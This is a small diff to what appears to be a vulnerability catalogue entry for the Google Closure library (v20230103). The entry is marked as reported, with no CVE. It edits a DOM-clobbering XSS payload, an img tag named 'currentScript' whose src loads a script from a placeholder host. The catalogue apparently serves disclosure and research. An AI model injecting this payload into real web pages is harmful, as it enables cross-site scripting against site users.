@@ -5,7 +5,7 @@
 + Library: Google Closure
 + Stars: 4.9K
 + Version: v20230103
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>```
++ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js">```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
